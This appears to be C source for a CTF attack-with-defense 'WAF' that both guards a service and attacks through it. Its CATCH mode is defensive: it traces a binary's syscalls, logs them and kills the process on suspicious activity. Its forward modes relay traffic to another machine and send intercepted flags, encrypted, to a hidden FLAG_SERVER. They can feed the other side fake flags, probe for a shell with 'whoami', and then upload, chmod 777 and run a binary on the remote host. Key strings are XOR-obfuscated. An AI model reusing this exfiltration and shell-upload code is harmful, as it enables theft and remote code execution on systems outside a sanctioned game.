#include "config.h"
#include "logger.h"
#include "AES.h"
#include "rsa.h"
char LOGO[] = "// CTF AWD PWN WAF\n// programmed By xia0ji233\n";
char OPEN[] = "\n<-------------------- open ------------------>\n";
char BASE64_CHARS[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#if MODE == CATCH
char READ[] = "\n<-------------------- read ------------------>\n";
char WRITE[] = "\n<-------------------- write ----------------->\n";
#else
char READ[] = "\n<-------------------- send ------------------>\n";
char WRITE[] = "\n<-------------------- recv ----------------->\n";
#endif
char EXECVE[] = "\n<-------------------- execve ----------------->\n";
char DANGEROUS[] = "\n<-------------------- bad system call ----------------->\n";
char PROCESS[] = "\n<-------------------- Process ----------------->\n";
char UPLOAD[] = "\n<-------------------- upload shell ----------------->\n";
char END[] = "\n<-------------------- Process Exit ----------------->\n";
char CLOSE[] = "\n<-------------------- Server close ----------------->\n";
char buffer[BUFFER_SIZE];
#if (MODE != CATCH)
char sendbuffer[BUFFER_SIZE];
int sendlen = 0;
char recvbuffer[BUFFER_SIZE];
int recvlen = 0;
int sendtimes = 0;
int recvtimes = 0;
#define INPUT MODE_SEND
#define OUTPUT MODE_RECV
#define RBUFFER sendbuffer
#define WBUFFER recvbuffer
#define RTIMES sendtimes
#define WTIMES recvtimes
#define RLEN sendlen
#define WLEN recvlen
#else
char readbuffer[BUFFER_SIZE];
int readlen = 0;
char writebuffer[BUFFER_SIZE];
int writelen = 0;
int readtimes = 0;
int writetimes = 0;
#define INPUT MODE_READ
#define OUTPUT MODE_WRITE
#define RBUFFER readbuffer
#define WBUFFER writebuffer
#define RTIMES readtimes
#define WTIMES writetimes
#define RLEN readlen
#define WLEN writelen
#endif

/*
向指定进程读取指定长度的字节
*/
void WAF_readnbytes(int pid, long addr, char *buffer, size_t nbytes)
{
    long d = 0;
    for (int i = 0; i < (int)nbytes; i += 8)
    {
        d = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
        if (i + 8 <= (int)nbytes)
        {
            *(long *)(buffer + i) = d;
        }
        else
        {
            // 末尾不足8字节，逐字节拷贝防止越界
            memcpy(buffer + i, &d, nbytes - i);
        }
    }
}
/*
向指定进程读取字符串
*/
void WAF_readstr(int pid, long addr, char *buffer, size_t size)
{
    long d;
    for (int i = 0;; i++)
    {
        d = ptrace(PTRACE_PEEKDATA, pid, addr + i * 8, NULL);
        *((long *)buffer + i) = d;
        if (strlen((char *)&d) < 8 || i * 8 > size)
            break; // 检查零字节和缓冲区大小
    }
}

void WAF_log_open()
{
    char time_str[128] = {0};
    char file_name[0x100] = {0};
    struct timeval tv;
    time_t time_;
    gettimeofday(&tv, NULL);
    time_ = tv.tv_sec;
    struct tm *p_time = localtime(&time_);
    strftime(time_str, sizeof(time_str), "%H_%M_%S", p_time);
    snprintf(file_name, sizeof(file_name), "%s/%s_%lx-%d%s", XorString(LOG_PATH), time_str, tv.tv_usec, getpid(), ".log");
    if (logger_open(file_name) == 0)
    {
        printf("Open log [%s] file failed!\n", file_name);
        exit(-1);
    }
}
void WAF_write_logo()
{
    char time_str[128] = {0};
    struct timeval tv;
    time_t now;
    gettimeofday(&tv, NULL);
    now = tv.tv_sec;
    struct tm *p_time = localtime(&now);
    strftime(time_str, sizeof(time_str), "// Date: %Y-%m-%d %H:%M:%S\n", p_time);
    logger_write(time_str, strlen(time_str));
    logger_write((char *)LOGO, sizeof(LOGO) - 1);
    if (MODE == CATCH)
    {
        sprintf(buffer, "// Mode: %s", "CATCH-protect the file and ban dangerous operation\n");
    }
    else if (MODE == FORWARD)
    {
        sprintf(buffer, "// Mode: %s", "FORWARD-forward tcp traffic to a certain machine and listen it\n");
    }
    else if (MODE == MULTI_FORWARD)
    {
        sprintf(buffer, "// Mode: %s", "MULTI_FORWARD-forward tcp traffic to a random machine and listen it\n");
    }
    logger_write(buffer, strlen(buffer));
}

void WAF_write_hex_log(char *buffer, size_t size, int mode)
{ // mode==0 read,mode==1 write
    char v[0x20];
    if (mode == INPUT)
    {
        logger_write((char *)READ, sizeof(READ) - 1);
        logger_write_printable(buffer, size);

        sprintf(v, "\n\nr_%d = ", RTIMES);
        logger_write(v, strlen(v));
        logger_write_hex(buffer, size);
        RTIMES++;
    }
    else
    {
        logger_write((char *)WRITE, sizeof(WRITE) - 1);
        logger_write_printable(buffer, size);
        sprintf(v, "\n\nw_%d = ", WTIMES);
        logger_write(v, strlen(v));
        logger_write_hex(buffer, size);
        WTIMES++;
    }
}

void WAF_flush_readbuffer()
{
    WAF_write_hex_log(RBUFFER, RLEN, INPUT);
    RLEN = 0;
}

void WAF_flush_writebuffer()
{
    WAF_write_hex_log(WBUFFER, WLEN, OUTPUT);
    WLEN = 0;
}

void WAF_flush_rwbuffer()
{
    // printf("%d %d\n",readlen,writelen);
    if (RLEN)
    {
        WAF_flush_readbuffer();
    }
    if (WLEN)
    {
        WAF_flush_writebuffer();
    }
}

void WAF_write_execve(char *path, long argv, long env)
{
    char buffer[0x50];
    WAF_flush_rwbuffer();
    logger_write((char *)EXECVE, sizeof(EXECVE) - 1);
    sprintf(buffer, "\ncall execve(\"%s\",0x%lx,0x%lx)\n", path, argv, env);
    logger_write(buffer, strlen(buffer));
#if (EXECVE_MODE == EXECVE_ABORT)

#endif
}

void WAF_write_open(char *path)
{
    char buffer[0x300];
    WAF_flush_rwbuffer();
    logger_write((char *)OPEN, sizeof(OPEN) - 1);
    sprintf(buffer, "\ntry to open file \"%s\"\n", path);
    logger_write(buffer, strlen(buffer));
}

void WAF_write_system(long rax)
{
    char buffer[0x300];
    WAF_flush_rwbuffer();
    logger_write((char *)DANGEROUS, sizeof(DANGEROUS) - 1);
    sprintf(buffer, "system call number=%ld\n", rax);
    logger_write(buffer, strlen(buffer));
}

void WAF_protect()
{
#if MODE == CATCH
    int status;
    pid_t pid;
    int pstdin[] = {-1, -1};
    int pstdout[] = {-1, -1};
    pipe(pstdin);
    pipe(pstdout);
    pid = fork();
    if (pid < 0)
    {
        perror("fork");
        return;
    }
    if (pid == 0)
    {
        dup2(pstdin[0], 0);
        dup2(pstdout[1], 1);
        dup2(pstdout[1], 2);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        char **argv = NULL, **env = NULL;
        execve(XorString(RUN_PATH), argv, env);
        perror(XorString("execve"));
        exit(-1);
    }
    else
    {
        struct user_regs_struct regs;
        status = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
        if (status < 0)
        {
            perror("ptrace:");
            exit(-1);
        }
        WAF_log_open();
        WAF_write_logo();
        int in_syscall = 0;
        long orax = -1;
        for (;;)
        {
            long rax, rdi, rsi, rdx, rcx, r8, r9, rip, ret;
            ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
            wait(&status);
            if (WIFEXITED(status))
            {
            EXIT:
                logger_write((char *)END, sizeof(END) - 1);
                logger_close();
                break;
            }
            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
            rax = regs.orig_rax;
            rdi = regs.rdi;
            rsi = regs.rsi;
            rdx = regs.rdx;
            rcx = regs.rcx;
            r8 = regs.r8;
            r9 = regs.r9;
            rip = regs.rip;
            ret = regs.rax;
            if (orax != rax)
                in_syscall = 0;
            // printf("rax= %d\n\0 rdi=%p in=%d rip=%p\n",rax,rdi,in_syscall,rip);
            if (in_syscall)
            { // 系统调用结束之后，处理输出和记录
                if (rax == __NR_read)
                {
                    // printf("fd=%d\n",rdi);
                    if (rdi == 0)
                    {
                        // printf("rax=%d\n",ret);
                        WAF_readnbytes(pid, rsi, buffer, ret);
                        if (writelen != 0)
                        { // 读的时候写缓冲区有数据则打印出来
                            WAF_flush_writebuffer();
                        }
                        if (readlen + ret >= BUFFER_SIZE)
                        { // 若超出缓冲区大小则先打印
                            WAF_flush_readbuffer();
                        }
                        memcpy(readbuffer + readlen, buffer, ret); // 这里使用实际读入字节，也就是read的返回值作为长度
                        readlen += ret;
                        // WAF_write_hex_log(buffer,ret,MODE_READ);
                    }
                }
                else if (rax == __NR_write)
                {
                    if (rdi == 1 || rdi == 2)
                    {
                        int size = read(pstdout[0], buffer, rdx);
                        if (size <= 0) goto next;
                        write(1, buffer, size);
                        if (readlen != 0)
                        {
                            WAF_flush_readbuffer();
                        }
                        if (writelen + size > BUFFER_SIZE)
                        {
                            WAF_flush_writebuffer();
                        }
                        memcpy(writebuffer + writelen, buffer, size);
                        writelen += size;
                    next:;
                    }
                }
                else if (rax == __NR_execve)
                {
                    // puts("\n123");
                }
                else if (rax == __NR_clone)
                {
                    logger_write((char *)PROCESS, sizeof(PROCESS) - 1);
                    sprintf(buffer, "Create process pid=%ld,", ret);
                    logger_write(buffer, strlen(buffer));
                    goto ABORT;
                    // pid=ret;
                    // ptrace(PTRACE_ATTACH,pid,NULL,NULL);
                }
                in_syscall = 0;
                orax = rax;
            }
            else
            {
                if (rax == __NR_read)
                { // 系统调用前，需要处理read
                    if (rdi == 0)
                    { // 处理标准输入
                        int size = read(0, buffer, rdx);
                        write(pstdin[1], buffer, size);
                    }
                }
                else if (rax == __NR_execve)
                {
                    if (rdi != 0)
                    {
                        WAF_readstr(pid, rdi, buffer, sizeof(buffer));
                        WAF_write_execve(buffer, rsi, rdx); // 获取execve执行的路径
                        if (strncmp(XorString(RUN_PATH), buffer, sizeof(RUN_PATH) - 1))
                        { // 如果执行进程与目标进程一致则放行，否则杀死
#if (EXECVE_MODE == EXECVE_ABORT)
                        ABORT:
                            logger_write("ABORT!\n", 7);
                            ptrace(PTRACE_KILL, pid, NULL, NULL); // 直接杀死目标进程
                            goto EXIT;
#endif
                        }
                    }
                }
                else if (OPEN_SYSCALL(rax))
                { // 处理打开文件
                    switch (rax)
                    { // 获取文件路径
                    case __NR_open:
                        WAF_readstr(pid, rdi, buffer, sizeof(buffer));
                        break;
                    case __NR_openat:
                    case __NR_openat2:
                        WAF_readstr(pid, rsi, buffer, sizeof(buffer));
                        break;
                    default:
                        strcpy(buffer, "NULL");
                        break;
                    }
                    if (strstr(buffer, XorString(FILE_WHITE)) == NULL)
                    {
                        WAF_write_open(buffer);
                        if (strstr(buffer, XorString(FILE_BLACK)) != NULL)
                        { // 出现黑名单关键字则拦截
                            goto ABORT;
                        }
                    }
                }
                else if (rax == __NR_clone)
                {
                    WAF_flush_rwbuffer();
                    logger_write((char *)PROCESS, sizeof(PROCESS) - 1);
                    sprintf(buffer, "call clone(0x%lx,0x%lx,0x%lx,0x%lx,0x%lx,0x%lx),wait it returns\n", rdi, rsi, rdx, rcx, r8, r9);
                    logger_write(buffer, strlen(buffer));
                    // rdi|=CLONE_FILES;
                    // if(ptrace(PTRACE_GETREGS, pid, NULL, &regs)==-1){
                    //     perror("ptrace");
                    // }
                }
                else if (DANGEROUS_SYSCALL(rax))
                { // 危险系统调用直接拦截
                    WAF_write_system(rax);
                    goto ABORT;
                }

                in_syscall = 1;
                orax = rax;
            }
        }
    }
#endif
}

int connect_server(char *ip, ushort port)
{
    struct sockaddr_in server_addr;
    int server_fd = -1;
    server_fd = socket(AF_INET, SOCK_STREAM, 0); // 建立TCP连接
    if (server_fd == -1)
    {
        perror("socket");
        return -1;
    }
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_aton(ip, (struct in_addr *)&server_addr.sin_addr.s_addr) == 0)
    {
        perror("ip error");
        close(server_fd); // 修复：inet_aton 失败时关闭已打开的 socket
        return -1;
    }
    if (connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
    {
        perror("connect");
        close(server_fd); // 修复：connect 失败时关闭 socket 再退出
        exit(-1);
    }
    return server_fd;
}

void set_fd_nonblock(int fd)
{
    int flags = fcntl(fd, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int TestFlag(char *buffer)
{
#if MODE != CATCH
    if (MATCH_MODE == MODE_PRESUF)
    { // 首尾检测法
        int l = 0, r = strlen(buffer) - 1;
        while ((buffer[r] == 0 || buffer[r] == '\n') && l < r)
        {
            buffer[r] = 0;
            r--; // 尽量排除零字节和回车带来的干扰
        }
        if (memcmp(buffer, PREFIX, sizeof(PREFIX) - 1) == 0 && memcmp(buffer + r, SUFFIX, 1) == 0)
        { // 是flag
            return 1;
        }
    }
    return 0;
#endif
}

int InTable(char c, char *table)
{
    int len = strlen(table);
    for (int i = 0; i < len; i++)
    {
        if (c == table[i])
            return 1;
    }
    return 0;
}

void SendFlag(char *flag, int flag_len)
{ // 向自己的服务器发送数据
#if MODE != CATCH
    struct sockaddr_in serverAddr;
    int clientSocket = socket(PF_INET, SOCK_DGRAM, 0);
    serverAddr.sin_family = PF_INET;
    serverAddr.sin_port = htons(FLAG_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(XorString(FLAG_SERVER));
    int ret = sendto(clientSocket, flag, flag_len, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    close(clientSocket);
#endif
}

void base64_encode(const char *input, char *output, int len)
{
    int i, j;
    unsigned char buf[3];
    int num_bits = 0, bits;

    for (i = 0, j = 0; i < len; i++)
    {
        buf[num_bits++] = input[i];
        if (num_bits == 3)
        {
            bits = (buf[0] << 16) | (buf[1] << 8) | buf[2];
            output[j++] = BASE64_CHARS[(bits >> 18) & 0x3F];
            output[j++] = BASE64_CHARS[(bits >> 12) & 0x3F];
            output[j++] = BASE64_CHARS[(bits >> 6) & 0x3F];
            output[j++] = BASE64_CHARS[bits & 0x3F];
            num_bits = 0;
        }
    }

    if (num_bits > 0)
    {
        bits = (buf[0] << 16) | ((num_bits == 2) ? (buf[1] << 8) : 0);
        output[j++] = BASE64_CHARS[(bits >> 18) & 0x3F];
        output[j++] = BASE64_CHARS[(bits >> 12) & 0x3F];
        output[j++] = (num_bits == 1) ? '=' : BASE64_CHARS[(bits >> 6) & 0x3F];
        output[j++] = '=';
    }
    output[j] = '\0';
}

void base64_decode(const char *input, char *output, int *out_len)
{
    int i, j;
    unsigned char buf[4];
    int num_bits = 0, bits;
    int input_len = strlen(input);

    for (i = 0, j = 0; i < input_len; i++)
    {
        if (input[i] == '=')
            break;
        const char *p = strchr(BASE64_CHARS, input[i]);
        if (p)
        {
            buf[num_bits++] = p - BASE64_CHARS;
            if (num_bits == 4)
            {
                bits = (buf[0] << 18) | (buf[1] << 12) | (buf[2] << 6) | buf[3];
                output[j++] = (bits >> 16) & 0xFF;
                output[j++] = (bits >> 8) & 0xFF;
                output[j++] = bits & 0xFF;
                num_bits = 0;
            }
        }
    }

    if (num_bits > 0)
    {
        bits = (buf[0] << 18) | ((num_bits > 1 ? buf[1] << 12 : 0)) | ((num_bits > 2 ? buf[2] << 6 : 0));
        output[j++] = (bits >> 16) & 0xFF;
        if (num_bits > 2)
            output[j++] = (bits >> 8) & 0xFF;
    }
    *out_len = j;
}

void UploadShell(int fd)
{
#if MODE != CATCH
    char *s1 = (char *)malloc(SHELL_SIZE);
    char *s2 = (char *)malloc(SHELL_SIZE * 2);
    char cmd[0x500];
    char ss[0x400];
    int ffd = open(XorString(SHELL_PATH), O_RDONLY);
    logger_write((char *)UPLOAD, sizeof(UPLOAD) - 1);
    if (ffd < 0)
    {
        sprintf(buffer, "failed to open \"%s\"\n", XorString(SHELL_PATH));
        logger_write(buffer, strlen(buffer));
        goto EXIT;
    }
    int len = read(ffd, s1, SHELL_SIZE);
    close(ffd); // 修复：读完后立即关闭，防止 fd 泄漏
    memset(ss, 0, sizeof(ss));
    base64_encode(s1, s2, len);
    len = strlen(s2);
    sprintf(cmd, "rm %s;\n", XorString(TMPFILE));
    write(fd, cmd, strlen(cmd));
    for (int i = 0; i < len; i += 400)
    {
        strncpy(ss, s2 + i, 399);
        ss[399] = '\0';
        sprintf(cmd, "echo -n \"%s\" >> %s;\n", ss, XorString(TMPFILE));
        write(fd, cmd, strlen(cmd));
    }
    sprintf(cmd, "cat %s | base64 -d > %s;\n", XorString(TMPFILE), XorString(SHELL_EXECUTE));
    write(fd, cmd, strlen(cmd));

    sprintf(cmd, "rm %s;\n", XorString(TMPFILE));
    write(fd, cmd, strlen(cmd));

    sprintf(cmd, "chmod 777 %s;\n", XorString(SHELL_EXECUTE));
    write(fd, cmd, strlen(cmd));
    sprintf(cmd, "%s 0;\n", XorString(SHELL_EXECUTE));
    write(fd, cmd, strlen(cmd));
    sprintf(buffer, "upload success\n");
    logger_write(buffer, strlen(buffer));
EXIT:
    free(s1);
    free(s2);
    return;
#endif
}

void WAF_forward()
{
#if MODE != CATCH
    fd_set read_fds, test_fds;
    int client_read_fd = 0;
    int client_write_fd = 1;
    int client_error_fd = 2;
    char *server_ip = NULL;
#if (MODE == FORWARD)
    server_ip = FORWARD_IP;
#elif (MODE == MULTI_FORWARD)
    char *ip_list[] = FORWARD_IP_List;
    size_t k = sizeof(ip_list) / sizeof(char *);
    srandom(time(NULL));
    int ch = rand() % k;
    server_ip = ip_list[ch];
#endif
    ushort server_port = FORWARD_PORT;
    int server_fd = connect_server(server_ip, server_port);

    FD_ZERO(&read_fds);
    FD_ZERO(&test_fds);

    FD_SET(server_fd, &read_fds);
    FD_SET(client_read_fd, &read_fds);

    set_fd_nonblock(server_fd);
    set_fd_nonblock(client_read_fd);

    char info[0x100];
    WAF_log_open();
    WAF_write_logo();
    sprintf(info, "// Target Server: %s:%d\n", server_ip, server_port);
    logger_write(info, strlen(info));

    // shell 检测状态机
    // IDLE(0): 等待 flag
    // WAIT_FLAG(1): 已收到 flag，等待当前帧读完后发 whoami
    // SENT_WHOAMI(2): 已发 whoami，等待下一帧回显
    // VERIFY_SHELL(3): 收到服务器响应，验证是否为 whoami 结果
#define SHELL_STATE_IDLE        0
#define SHELL_STATE_WAIT_FLAG   1
#define SHELL_STATE_SENT_WHOAMI 2
#define SHELL_STATE_VERIFY      3
    int shell_state = SHELL_STATE_IDLE;
    int whoami_timeout = 0; // 等待 whoami 响应的轮次计数

    while (1)
    {
        test_fds = read_fds;
        int result = select(FD_SETSIZE, &test_fds, (fd_set *)0, (fd_set *)0, (struct timeval *)0);
        if (result < 1)
        {
            perror("select");
            exit(-1);
        }
        for (int fd = 0; fd < FD_SETSIZE; fd++)
        {
            if (FD_ISSET(fd, &test_fds))
            {
                if (fd == server_fd)
                { // 来自服务器的输出，recv 接收
                    WLEN = read(server_fd, WBUFFER, BUFFER_SIZE - 1);
                    if (WLEN <= 0)
                    { // 服务器断开
                        logger_write((char *)CLOSE, sizeof(CLOSE) - 1);
                        logger_close();
                        return;
                    }
                    // 安全地 null 终止，防止 off-by-one
                    WBUFFER[WLEN] = '\0';
                    memcpy(buffer, WBUFFER, WLEN);
                    buffer[WLEN] = '\0';

                    if (shell_state == SHELL_STATE_IDLE && TestFlag(buffer))
                    { // 仅在 IDLE 状态时处理 flag，防止重复触发
                        uint8_t *blocks = NULL;
                        int block_num = splitBlock(buffer, &blocks);
                        aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY), block_num, (uint8_t *)XorString(AES_IV));
                        /* RSA 加密 AES 密文 */
                        uint8_t rsa_out[RSA_BYTES];
                        rsa_encrypt(blocks, block_num * 16, rsa_out);
                        SendFlag((char *)rsa_out, RSA_BYTES);
#if CHEAT
                        srand(time(NULL) / ROUND_TIME);
                        int flaglen = strlen(buffer);
                        for (int i = sizeof(PREFIX); i < flaglen - 1; i++)
                        {
                            int k = rand() % (sizeof(CHEAT_TABLE) - 1);
                            if (InTable(buffer[i], CHEAT_TABLE))
                                buffer[i] = CHEAT_TABLE[k]; // 在字符集内随机替换
                        }
#endif
                        free(blocks);
#if CHEAT
                        if (CHEAT)
                        { // 记录日志：已返回假 flag
                            char logbuf[0x200];
                            snprintf(logbuf, sizeof(logbuf),
                                     "\nWarning: FLAG detected, sent fake flag to client\n");
                            logger_write(logbuf, strlen(logbuf));
                        }
#endif
                        // 进入等待 whoami 阶段
                        shell_state = SHELL_STATE_WAIT_FLAG;
                    }

                    // 在 SENT_WHOAMI 状态下，服务器的响应就是 whoami 结果
                    if (shell_state == SHELL_STATE_SENT_WHOAMI)
                    {
                        shell_state = SHELL_STATE_VERIFY;
                    }

                    // 在测试 shell 期间不向客户端回显服务器输出
                    if (shell_state == SHELL_STATE_IDLE || shell_state == SHELL_STATE_WAIT_FLAG)
                        write(client_write_fd, buffer, WLEN);
                }
                else if (fd == client_read_fd)
                { // 程序标准输入，转发给服务器
                    RLEN = read(client_read_fd, RBUFFER, BUFFER_SIZE - 1);
                    if (RLEN <= 0)
                    { // 客户端断开
                        logger_write((char *)CLOSE, sizeof(CLOSE) - 1);
                        logger_close();
                        return;
                    }
                    write(server_fd, RBUFFER, RLEN);
                }

                if (RLEN > 0 || WLEN > 0)
                {
                    WAF_flush_rwbuffer(); // 输出缓冲区到日志
                }

#if UPLOAD_SHELL
                // 状态机驱动：在当前帧处理完后驱动 shell 检测流程
                if (shell_state == SHELL_STATE_WAIT_FLAG)
                {
                    // 发送 whoami 命令探测 shell
                    strcpy(RBUFFER, XorString("whoami\n"));
                    RLEN = strlen(RBUFFER);
                    write(server_fd, RBUFFER, RLEN);
                    WAF_flush_readbuffer();
                    sprintf(buffer, "\nNotice: Start shell test (sent whoami)\n");
                    logger_write(buffer, strlen(buffer));
                    shell_state = SHELL_STATE_SENT_WHOAMI;
                    whoami_timeout = 0;
                }
                else if (shell_state == SHELL_STATE_SENT_WHOAMI)
                {
                    // 等待服务器响应，超过若干轮则放弃
                    whoami_timeout++;
                    if (whoami_timeout > 10)
                    {
                        sprintf(buffer, "\nError: Shell test timeout, giving up\n");
                        logger_write(buffer, strlen(buffer));
                        shell_state = SHELL_STATE_IDLE;
                        whoami_timeout = 0;
                    }
                }
                else if (shell_state == SHELL_STATE_VERIFY)
                {
                    // 用 strstr 匹配，兼容 "ctf\n" 等行尾字符
                    if (strstr(WBUFFER, XorString(USER)) != NULL)
                    {
                        sprintf(buffer, "\nNotice: Shell test success (got: %.32s), uploading shell\n",
                                WBUFFER);
                        logger_write(buffer, strlen(buffer));
                        UploadShell(server_fd);
                    }
                    else
                    {
                        sprintf(buffer, "\nError: Shell test failed (got: %.32s)\n", WBUFFER);
                        logger_write(buffer, strlen(buffer));
                    }
                    shell_state = SHELL_STATE_IDLE;
                    whoami_timeout = 0;
                }
#endif
            }
        }
    }
#endif
}

void generate_ELF()
{
    int len;
    char content[] = "";
    if (strlen(content) == 0)
        return; /* ELF 内容为空，跳过生成 */
    char *s = (char *)malloc(strlen(content) + 1);
    base64_decode(content, s, &len);
    int fd = open(XorString("/tmp/pwn"), O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd >= 0)
    {
        write(fd, s, len);
        close(fd);
    }
    free(s);
}

int main()
{
    signal(SIGPIPE, SIG_IGN); /* 防止转发连接断开时 SIGPIPE 崩溃 */
    generate_ELF();
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    logger_init(XorString(LOG_PATH));
#if (MODE == CATCH)
    WAF_protect();
#elif (MODE == FORWARD)
    WAF_forward();
#elif (MODE == MULTI_FORWARD)
    WAF_forward();
#else
    printf("unknown mode\n");
#endif
}
